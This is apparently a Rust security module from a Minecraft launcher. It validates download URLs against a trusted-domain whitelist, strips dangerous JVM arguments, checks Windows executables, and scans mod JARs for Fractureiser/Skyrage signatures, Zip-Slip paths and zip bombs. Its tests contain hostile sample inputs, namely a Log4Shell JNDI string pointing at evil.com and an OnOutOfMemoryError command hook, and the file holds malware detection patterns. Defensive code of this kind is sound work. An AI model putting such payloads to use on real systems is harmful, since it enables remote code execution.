use serde::{Deserialize, Serialize};
use std::fs::{self, File};
use std::io::Read;
use std::path::Path;
use zip::ZipArchive;

/// Trusted root domains allowed for downloading mods, modpacks, Java runtimes, and updates.
const TRUSTED_DOMAIN_SUFFIXES: &[&str] = &[
    "modrinth.com",
    "curseforge.com",
    "forgecdn.net",
    "mojang.com",
    "minecraft.net",
    "fabricmc.net",
    "neoforged.net",
    "minecraftforge.net",
    "quiltmc.org",
    "adoptium.net",
    "github.com",
    "githubusercontent.com",
    "microsoft.com",
    "aka.ms",
];

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SecurityThreatItem {
    pub file_name: String,
    pub severity: String, // "high" | "medium"
    pub reason_tr: String,
    pub reason_en: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SecurityScanReport {
    pub scanned_files: usize,
    pub safe_files: usize,
    pub passed: bool,
    pub threats: Vec<SecurityThreatItem>,
}

/// Validates that a download URL uses HTTPS and points to a trusted official CDN/API domain,
/// blocking SSRF, local network probing, cleartext HTTP MITM, and untrusted malware hosts.
pub fn validate_trusted_download_url(url: &str) -> Result<(), String> {
    let trimmed = url.trim();
    let rest = trimmed.strip_prefix("https://").ok_or_else(|| {
        format!(
            "Güvenlik Engeli (SkyShield): Yalnızca şifreli HTTPS bağlantılarına izin verilir ({})",
            trimmed
        )
    })?;

    let host_port = rest.split('/').next().unwrap_or("");
    let host = host_port
        .split(':')
        .next()
        .unwrap_or("")
        .trim()
        .to_lowercase();

    if host.is_empty()
        || host == "localhost"
        || host.starts_with("127.")
        || host.starts_with("10.")
        || host.starts_with("192.168.")
        || host.starts_with("0.")
        || host.starts_with('[')
    {
        return Err(format!(
            "Güvenlik Engeli (SkyShield): Yerel veya geçersiz ağ adresine erişim engellendi ({})",
            host
        ));
    }

    let is_trusted = TRUSTED_DOMAIN_SUFFIXES
        .iter()
        .any(|&domain| host == domain || host.ends_with(&format!(".{}", domain)));

    if !is_trusted {
        return Err(format!(
            "Güvenlik Engeli (SkyShield): Güvenilir beyaz listede olmayan indirme kaynağı engellendi ({})",
            host
        ));
    }

    Ok(())
}

/// Filters out dangerous JVM arguments that could be abused for arbitrary command execution (RCE)
/// or JNDI/Log4Shell injection when importing third-party modpack configs.
pub fn sanitize_jvm_arguments(args: &[String]) -> Vec<String> {
    let mut safe_args = Vec::with_capacity(args.len() + 1);

    for raw in args {
        let arg = raw.trim();
        if arg.is_empty() {
            continue;
        }
        let lower = arg.to_lowercase();

        // Block dangerous RCE / agent / callback flags
        if lower.starts_with("-javaagent:")
            || lower.starts_with("-agentpath:")
            || lower.starts_with("-agentlib:")
            || lower.starts_with("-xx:onerror")
            || lower.starts_with("-xx:onoutofmemoryerror")
            || lower.contains("${jndi:")
            || lower.contains("ldap://")
            || lower.contains("rmi://")
        {
            continue;
        }

        safe_args.push(arg.to_string());
    }

    // Always enforce Log4Shell mitigation flag
    if !safe_args
        .iter()
        .any(|a| a.contains("log4j2.formatMsgNoLookups"))
    {
        safe_args.push("-Dlog4j2.formatMsgNoLookups=true".to_string());
    }

    safe_args
}

/// Verifies that a downloaded Windows `.exe` file begins with a valid PE `MZ` header (`0x4D 0x5A`)
/// and is at least 100 KB so corrupted streams or HTML error pages never overwrite the executable.
pub fn verify_pe_executable(file_path: &Path) -> Result<(), String> {
    let meta =
        fs::metadata(file_path).map_err(|e| format!("İndirilen dosya doğrulanamadı: {}", e))?;
    if meta.len() < 100 * 1024 {
        return Err(format!(
            "Güvenlik Engeli (SkyShield): İndirilen .exe dosyası çok küçük ({} bayt). Geçersiz veya bozuk indirme.",
            meta.len()
        ));
    }

    let mut file = File::open(file_path).map_err(|e| e.to_string())?;
    let mut magic = [0u8; 2];
    file.read_exact(&mut magic)
        .map_err(|_| "Dosya başlığı okunamadı.".to_string())?;

    if &magic != b"MZ" {
        return Err(
            "Güvenlik Engeli (SkyShield): İndirilen dosya geçerli bir Windows çalıştırılabilir dosyası (PE/MZ) değil!"
                .to_string(),
        );
    }

    Ok(())
}

/// Scans all `.jar` files in an instance's `mods/` folder in-memory for known malware signatures
/// (Fractureiser, Skyrage), embedded scripts/executables (`.exe`, `.bat`, `.ps1`, `.vbs`),
/// Zip-Slip path traversal, and Zip-Bomb compression anomalies.
pub fn scan_instance_security(game_dir: &Path) -> Result<SecurityScanReport, String> {
    let mods_dir = game_dir.join("mods");
    if !mods_dir.exists() {
        return Ok(SecurityScanReport {
            scanned_files: 0,
            safe_files: 0,
            passed: true,
            threats: Vec::new(),
        });
    }

    let mut scanned_files = 0usize;
    let mut threats = Vec::new();

    let entries = fs::read_dir(&mods_dir).map_err(|e| e.to_string())?;
    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let file_name = match path.file_name().and_then(|n| n.to_str()) {
            Some(n) => n.to_string(),
            None => continue,
        };
        if !file_name.ends_with(".jar") && !file_name.ends_with(".jar.disabled") {
            continue;
        }

        scanned_files += 1;
        let file = match File::open(&path) {
            Ok(f) => f,
            Err(_) => continue,
        };
        let mut archive = match ZipArchive::new(file) {
            Ok(a) => a,
            Err(_) => {
                threats.push(SecurityThreatItem {
                    file_name,
                    severity: "medium".to_string(),
                    reason_tr: "Bozuk veya geçersiz JAR/ZIP arşiv yapısı.".to_string(),
                    reason_en: "Corrupted or invalid JAR/ZIP archive structure.".to_string(),
                });
                continue;
            }
        };

        let mut total_uncompressed: u64 = 0;
        for i in 0..archive.len() {
            let ze = match archive.by_index_raw(i) {
                Ok(e) => e,
                Err(_) => continue,
            };
            let entry_name = ze.name().replace('\\', "/");
            let lower_name = entry_name.to_lowercase();
            total_uncompressed = total_uncompressed.saturating_add(ze.size());

            // 1. Zip-Slip path traversal detection
            if entry_name.contains("../") || entry_name.starts_with('/') {
                threats.push(SecurityThreatItem {
                    file_name: file_name.clone(),
                    severity: "high".to_string(),
                    reason_tr: format!("Zip-Slip dizin aşımı tespit edildi: {}", entry_name),
                    reason_en: format!("Zip-Slip path traversal detected: {}", entry_name),
                });
                break;
            }

            // 2. Known Fractureiser / Skyrage malware package paths
            if lower_name.starts_with("dev/neko/")
                || lower_name.contains("skyrage")
                || lower_name.contains("fractureiser")
                || lower_name.ends_with("dl.bin")
            {
                threats.push(SecurityThreatItem {
                    file_name: file_name.clone(),
                    severity: "high".to_string(),
                    reason_tr: format!(
                        "Bilinen Minecraft zararlı yazılım imzası (Fractureiser/Skyrage) tespit edildi: {}",
                        entry_name
                    ),
                    reason_en: format!(
                        "Known Minecraft malware signature (Fractureiser/Skyrage) detected: {}",
                        entry_name
                    ),
                });
                break;
            }

            // 3. Embedded executable scripts inside mod JAR
            if lower_name.ends_with(".exe")
                || lower_name.ends_with(".bat")
                || lower_name.ends_with(".ps1")
                || lower_name.ends_with(".vbs")
                || lower_name.ends_with(".scr")
            {
                threats.push(SecurityThreatItem {
                    file_name: file_name.clone(),
                    severity: "high".to_string(),
                    reason_tr: format!(
                        "Mod arşivinin içinde şüpheli çalıştırılabilir dosya tespit edildi: {}",
                        entry_name
                    ),
                    reason_en: format!(
                        "Suspicious executable/script embedded inside mod JAR: {}",
                        entry_name
                    ),
                });
                break;
            }

            // 4. Zip-Bomb protection (> 1.5 GB uncompressed inside a single mod JAR)
            if total_uncompressed > 1_500 * 1024 * 1024 {
                threats.push(SecurityThreatItem {
                    file_name: file_name.clone(),
                    severity: "high".to_string(),
                    reason_tr: "Aşırı sıkıştırılmış arşiv boyutu (Zip-Bomb şüphesi).".to_string(),
                    reason_en: "Excessive uncompressed archive size (Suspected Zip-Bomb)."
                        .to_string(),
                });
                break;
            }
        }
    }

    let safe_files = scanned_files.saturating_sub(threats.len());
    Ok(SecurityScanReport {
        scanned_files,
        safe_files,
        passed: threats.is_empty(),
        threats,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_domain_whitelist_and_ssrf_protection() {
        assert!(validate_trusted_download_url(
            "https://cdn.modrinth.com/data/AANobbMI/versions/1.0/sodium.jar"
        )
        .is_ok());
        assert!(validate_trusted_download_url(
            "https://edge.forgecdn.net/files/4567/890/jei.jar"
        )
        .is_ok());
        assert!(validate_trusted_download_url(
            "http://cdn.modrinth.com/data/sodium.jar"
        )
        .is_err());
        assert!(validate_trusted_download_url("https://127.0.0.1:8080/evil.jar").is_err());
        assert!(validate_trusted_download_url("https://evil-malware-host.ru/mod.jar").is_err());
    }

    #[test]
    fn test_jvm_argument_sanitization() {
        let raw = vec![
            "-XX:+UseG1GC".to_string(),
            "-javaagent:C:\\malware\\hook.jar".to_string(),
            "-XX:OnOutOfMemoryError=calc.exe".to_string(),
            "-Dfoo=${jndi:ldap://evil.com/a}".to_string(),
        ];
        let clean = sanitize_jvm_arguments(&raw);
        assert_eq!(clean.len(), 2);
        assert_eq!(clean[0], "-XX:+UseG1GC");
        assert_eq!(clean[1], "-Dlog4j2.formatMsgNoLookups=true");
    }
}
